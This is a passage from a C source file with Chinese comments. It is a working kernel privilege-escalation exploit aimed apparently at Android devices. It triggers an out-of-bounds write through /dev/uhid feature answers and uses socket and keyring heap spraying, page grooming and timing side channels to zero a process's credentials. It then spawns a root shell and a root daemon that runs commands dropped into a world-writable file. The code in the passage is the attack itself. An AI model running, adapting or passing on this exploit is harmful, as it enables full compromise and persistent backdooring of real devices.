        g_spray_one = &spray_one_impl;
        for(int r=1; r<=nrnd; r++){
            /* 跨页分散选洞: 从活着的池中按步长取 (步长 >32 → 异页); 用 g_ns 含 grooming 追加 */
            {
                int stride = g_ns / K;
                if(stride < 40) stride = 40;
                int start = (r * 37 + 33) % g_ns;
                int cnt = 0;
                for(int t=0; t<g_ns && cnt<K; t++){
                    int idx = start + t*stride;
                    if(idx >= g_ns) idx %= g_ns;
                    if(g_sfd[idx]>=0){ victims[cnt]=g_sfd[idx]; markidx[cnt]=idx; cnt++; }
                }
                if(cnt<K){ printf("round %d: only %d victims\n", r, cnt); }
                /* 补齐未选中的槽位为 -1 (trigger_oob2 close(-1) 无害) */
                for(int j=cnt;j<K;j++) victims[j] = -1;
            }
            int a = trigger_oob2(victims, K, &hole_done);
            hole_done = 0;   /* 每轮都要重新关洞 */
            /* 本轮 victims 已 close, 先标记不可扫 (getsockopt 会 EBADF 假命中) */
            for(int j=0;j<K;j++){
                if(victims[j]>=0 && g_sfd[markidx[j]]==victims[j]) g_sfd[markidx[j]] = -1;
            }
            int hits=0;
            for(int i=0;i<g_ns;i++){
                if(g_sfd[i]<0) continue;
                rl=sizeof rb;
                int res=getsockopt(g_sfd[i], IPPROTO_IP, IP_OPTIONS, rb, &rl);
                if(res!=0 || rl!=40 || rb[0]!=0x01 || rb[39]!=0x01){
                    hits++;
                    if(hits<40)
                        printf("  ★ sock%d res=%d len=%d b0=%02x b39=%02x!!\n",
                               i, res, (int)rl, (int)(rl>0?rb[0]:0), (int)(rl>0?rb[39]:0));
                }
            }
            total_hits+=hits;
            printf("[%.3f] round %d: a=%d hits=%d total=%d\n", now_s(), r, a, hits, total_hits);
            usleep(300000);
        }
        printf("=== END total_hits=%d uid=%d ===\n", total_hits, getuid());
        if(total_hits>0){
            printf("PWN-STAGE5: holding...\n");
            while(1) pause();
        }
        return 2;
    }

    if (mode==6){
        /* cred 跨页零化 (§59 终局方案):
           m0+1 = 32 (slab 实测): CREATE 后探测的 31 个 kmalloc-128 + buf#1 = 探测首新页 F2 的末槽。
           get2#1 到达时内核阻塞: clone 爆发 (CLONE_VM|FS|FILES|SIGHAND, 非 THREAD)
           → 每子 prepare_creds → cred_jar 新页 C1 = buddy 紧邻 F2 之后
           (task_struct 走高阶池, mm/files/fs/sighand 共享不分配)
           → 应答#1 = OOB: w24 = 7(F2 尾) + 64(cred[0..0x40)) = 71 → rep3 = 191
           → memset 零化某子 cred[0..0x40) → getuid()==0 → root 守护 */
        if(pipe(pfd)<0) return 1;
        ufd = open("/dev/uhid", O_RDWR|O_CLOEXEC);
        if(ufd<0){ printf("uhid open: %s\n", strerror(errno)); return 1; }
        int xf = open("/data/local/tmp/pwn_f", O_RDWR|O_CREAT, 0600);
        if (xf>=0) close(xf);
        { int a1 = creat("/data/local/tmp/.rootok", 0666); if(a1>=0) close(a1);
          int a2 = creat("/data/local/tmp/.out", 0666); if(a2>=0) close(a2);
          chmod("/data/local/tmp/.rootok", 0666); chmod("/data/local/tmp/.out", 0666); }
        static const char *rootcmd =
            "echo uid0 > /data/local/tmp/.rootok;"
            "while true; do"
            " if [ -f /data/local/tmp/.cmd ]; then"
            "  sh /data/local/tmp/.cmd > /data/local/tmp/.out 2>&1;"
            "  rm -f /data/local/tmp/.cmd;"
            " fi; sleep 0.3; done";
        static char stacks[32][16384] __attribute__((aligned(16)));
        g_rootcmd = rootcmd;
        g_pipefd = pfd;
        g_spray_one = &spray_one_impl;
        memset(g_opt, 0x01, sizeof g_opt);
        /* warmup: 存活子进程排空 cred_jar partial — QEMU 用 slabinfo 监控
           (free = num−active < 40 才停), 保证 burst 时 cred 必取全新页 */
        {
            int nw = 0;
#ifdef QEMU_INIT
            for(int j=0;j<1200;j++){
                /* 同时排空 cred_jar 与 pid (各自 free<40) */
                int free_cred = -1, free_pid = -1;
                {
                    char big[16384];
                    lseek(g_slabfd, 0, SEEK_SET);
                    int n = read(g_slabfd, big, sizeof big - 1);
                    if(n > 0){ big[n]=0;
                        char *p = strstr(big, "cred_jar ");
                        int nn=-1, aa=-1;
                        if(p && sscanf(p+9, "%d %d", &aa, &nn) == 2) free_cred = nn-aa;
                        p = strstr(big, "pid ");
                        if(p && sscanf(p+4, "%d %d", &aa, &nn) == 2) free_pid = nn-aa;
                    }
                }
                if(free_cred >= 0 && free_cred < 40 && free_pid < 40) break;
                int pid = fork();
                if(pid==0){
                    for(int q=0;q<7200;q++){
                        if(syscall(174)==0){
                            setsid(); write(g_pipefd[1],"1",1);
                            signal(SIGPIPE, SIG_IGN); write(g_pipefd[1],"2",1);
                            execl("/system/bin/sh","sh","-c",g_rootcmd,(char*)NULL);
                            _exit(3);
                        }
                        usleep(500000);
                    }
                    _exit(0);
                }
                if(pid>0) nw++;
            }
#else
            /* 设备: 无 slabinfo, 固定大数 warmup (跨 boot 递增) */
            for(int j=0;j<400;j++){
                int pid = fork();
                if(pid==0){
                    for(int q=0;q<7200;q++){
                        if(syscall(174)==0){
                            setsid(); write(g_pipefd[1],"1",1);
                            signal(SIGPIPE, SIG_IGN); write(g_pipefd[1],"2",1);
                            execl("/system/bin/sh","sh","-c",g_rootcmd,(char*)NULL);
                            _exit(3);
                        }
                        usleep(500000);
                    }
                    _exit(0);
                }
                if(pid>0) nw++;
            }
#endif
            printf("[warmup] %d alive children\n", nw);
        }
        /* grave-dig: 512 socket 灌满 16 连续页 → 全关 → 页整体归还
           (最后释放的最高页 S 在 buddy/partial 栈顶)
           → fork 16 存活子: cred_jar 已排空 → cred 页 = 复用 S (grave-dig)
           → groom 的 F2' = kmalloc-128 partial 栈顶 = S−1 → cred 页 S = F2'+1 */
        {
            int rf[512];
            for(int k=0;k<512;k++){
                int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
                if(s>=0 && setsockopt(s, IPPROTO_IP, IP_OPTIONS, g_opt, sizeof g_opt)==0) rf[k]=s;
                else { if(s>=0) close(s); rf[k]=-1; }
            }
            for(int k=0;k<512;k++) if(rf[k]>=0) close(rf[k]);
            usleep(250000);   /* rcu: ip_options 释放 → 页全空 → discard → buddy/partial 栈顶 */
            /* burst 32 CLONE_VM: cred 页 C1/C2 = 从 grave-dig 页中分配
               (cred_jar/pid 已排空 → burst 的最后一个新页 = cred 页 C2)
               → descending pcp: C2 = bufpage+1 → OOB 窗口正好零化 C2[0..64) */
            int ng = 0;
            for(int j=0;j<32;j++){
                int pid = clone(mode6_child, stacks[j]+16384-16,
                                CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|SIGCHLD, NULL);
                if(pid<0) printf("clone fail j=%d errno=%d\n", j, errno); else ng++;
            }
            printf("[grave] 512 closed, %d grave clones\n", ng);
        }
        int burst_done = 0;
        for(int r=1; r<=nrnd; r++){
            printf("[%.3f] round %d start\n", now_s(), r);
            burst_done = 0;
            /* 时序锚定 groom (设备可用, 不依赖 slabinfo):
               页切换 = buddy 分配 + 32 槽 freelist 初始化 → setsockopt 延迟尖峰。
               检测到间隔恰 32 的两次尖峰 → 第二次 = 新页 slot0 的分配 (锚)。
               锚后 +25 groom → probe 5 + buf#1 = 该页第 32 分配 → 页满(安全)。
               buf#1 地址槽随机 (FREELIST_RANDOM) → 命中末槽(跨页零 cred) P=1/32/轮 */
            {
                int anchor = -1;
#ifdef QEMU_INIT
                /* QEMU: 固定 T0 (f=16 每次 boot 确定) → buf#1 = 页第 32 分配 (页满=安全)
                   地址槽随机 → 1/32 彩票/每次 boot; 多次 boot 刮奖 */
                anchor = 0;
                for(int k=0;k<g_t0;k++) g_spray_one();
#else
                /* 设备: 统计相位锚 — 页切换让该相位桶均值高 3-5µs,
                   256 样本分桶平均抗随机噪声; φ = 切换相位(新页首分配) */
                long long sum[32]; int cnt[32];
                memset(sum,0,sizeof sum); memset(cnt,0,sizeof cnt);
                long long t0 = nowns();
                for(int k=0;k<512;k++){
                    g_spray_one();
                    long long dt = nowns() - t0;
                    t0 = nowns();   /* 下一次计时起点 = 本次的结束(消除 syscall 间隔) */
                    int b = k & 31;
                    sum[b] += dt; cnt[b]++;
                }
                int phi = 0; long long best = -1;
                for(int b=0;b<32;b++){
                    if(!cnt[b]) continue;
                    long long av = sum[b]/cnt[b];
                    if(av > best){ best = av; phi = b; }
                }
                /* 对齐: 页的 32 个分配位于相位 φ..φ+31; groom 结束后还有
                   5 个 probe 分配 + buf#1(第6个) → groom 末相位 = φ+25,
                   buf#1 = φ+31 → extra = (φ+26 − cur) mod 32 (校准后立即对齐) */
                int cur = 512 & 31;
                int target = (phi + 26) & 31;
                int extra = (target - cur + 32) & 31;
                for(int k=0;k<extra;k++) g_spray_one();
                printf("[groom] phi=%d extra=%d (one line, minimize drift)\n", phi, extra);
#endif
            }
            struct uhid_event ea;
            memset(&ea,0,sizeof(ea));
            ea.type = UHID_CREATE;
            strcpy((char*)ea.u.create.name,"pw");
            strcpy((char*)ea.u.create.phys,"virt-0");
            strcpy((char*)ea.u.create.uniq,"p0");
            ea.u.create.rd_data = (void*)(uintptr_t)desc;
            ea.u.create.rd_size = desc_len;
            ea.u.create.bus = 0x0003;
            ea.u.create.vendor = 0x1234;
            ea.u.create.product = 0x5678;
            ea.u.create.version = 1;
            ea.u.create.country = 0;
            if (write(ufd,&ea,sizeof(ea))<=0){ printf("create fail\n"); return 1; }
            int answered=0, seq2=0, oob_done=0;
            for(int t=0;t<400 && answered<3;t++){
                struct pollfd pfd1 = { ufd, POLLIN, 0 };
                if(poll(&pfd1,1,20)<=0) continue;
                ssize_t rn=read(ufd,&ea,sizeof(ea));
                if(rn<=0) continue;
                if(ea.type==UHID_START||ea.type==UHID_OPEN||ea.type==UHID_CLOSE) continue;
                if(ea.type==9||ea.type==13){
                    int is_get2 = (ea.type==9 && ((uint8_t*)&ea.u)[4]==2);
                    if(is_get2) seq2++;
                    int oob = (is_get2 && seq2==1 && !oob_done);   /* OOB 用 buf#1 (F2' 末槽) */
                    struct uhid_event an;
                    memset(&an,0,sizeof(an));
                    an.type = 10;
                    an.u.feature_answer.id = ea.u.feature.id;
                    an.u.feature_answer.err = 0;
                    an.u.feature_answer.size = oob ? 128 : 1;
                    an.u.feature_answer.data[0] = oob ? 3 : 0;
                    write(ufd,&an,sizeof(an));
                    if(oob){ oob_done=1; printf("OOB-SENT\n"); }
                    answered++;
                }
            }
            for(int t=0;t<100;t++){
                struct pollfd pfd1 = { ufd, POLLIN, 0 };
                if(poll(&pfd1,1,20)<=0) continue;
                if(read(ufd,&ea,sizeof(ea))<=0) continue;
                if(ea.type==9||ea.type==13){
                    struct uhid_event an;
                    memset(&an,0,sizeof(an));
                    an.type=10;
                    an.u.feature_answer.id=ea.u.feature.id;
                    an.u.feature_answer.size=1;
                    write(ufd,&an,sizeof(an));
                }
            }
            memset(&ea,0,sizeof(ea));
            ea.type=UHID_DESTROY;
            write(ufd,&ea,sizeof(ea));
            /* 检测: 父 uid 或子管道信号 (n>0 才算, EOF=假信号) */
            if(getuid()==0){
                printf("★★★★★ ROOT: parent uid=0 — exec sh ★★★★★\n");
                fflush(stdout);
                execl("/system/bin/sh","sh",(char*)NULL);
                _exit(7);
            }
            struct pollfd p1 = { pfd[0], POLLIN, 0 };
            if(poll(&p1,1,300)>0){
                char cbuf[64]; memset(cbuf,0,sizeof cbuf);
                usleep(50000);
                int n = read(pfd[0], cbuf, sizeof cbuf - 1);
                if(n>0){
                    printf("★★★★★ PWNED trace: ");
                    for(int i=0;i<n;i++) printf("%02x ", (unsigned char)cbuf[i]);
                    printf("| %s\n", cbuf);
                    while(1) pause();
                }
            }
            usleep(500000);
        }
        printf("=== END mode6 uid=%d ===\n", getuid());
        while(1) pause();
        return 0;
    }

    /* mode 3: keys 密集喷射 */
    static int kid[6000];
    static char kdesc[64];
    static char kpay[160];
    memset(kpay,'A',sizeof(kpay));
    if (keyctl_setup() < 0){ printf("keyring setup fail\n"); return 1; }
    int kc=0;
    for(int i=0;i<narr;i++){
        snprintf(kdesc,sizeof(kdesc),"k%d",i);
        long id = sys_addkey(kdesc,kpay,160);
        if(id<0){ printf("add_key fail i=%d errno=%d\n", i, errno); break; }
        kid[kc++]=id;
    }
    printf("[%.3f] sprayed: %d keys\n", now_s(), kc);
    int ok=0;
    static char rbuf[256];
    for(int i=0;i<kc;i++) if(sys_keyctl_read(kid[i],rbuf,200)==160) ok++;
    printf("[%.3f] control: %d/%d healthy(160)\n", now_s(), ok, kc);

    ufd = open("/dev/uhid", O_RDWR|O_CLOEXEC);
    if(ufd<0){ printf("uhid open: %s\n", strerror(errno)); return 1; }
    int total_hits=0;
    for(int r=1; r<=nrnd; r++){
        /* 腾洞: keyctl revoke 释放一个 payload => kzalloc(138) 取它 */
        int victim = kc-1-r;
        if(victim<0) break;
        syscall(219, 7, kid[victim]);   /* KEYCTL_REVOKE */
        kid[victim] = -1;
        usleep(500);
        int a = trigger_once();
        int hits=0;
        for(int i=0;i<kc;i++){
            if(kid[i]<0) continue;
            int res=(int)sys_keyctl_read(kid[i],rbuf,200);
            if(res!=160){ hits++; printf("  ★ key%d res=%d!!\n", i, res); }
        }
        total_hits+=hits;
        printf("[%.3f] round %d: a=%d hits=%d total=%d\n", now_s(), r, a, hits, total_hits);
        usleep(300000);
    }
    printf("=== END(total_hits=%d uid=%d) ===\n", total_hits, getuid());
    return total_hits>0?0:2;
}
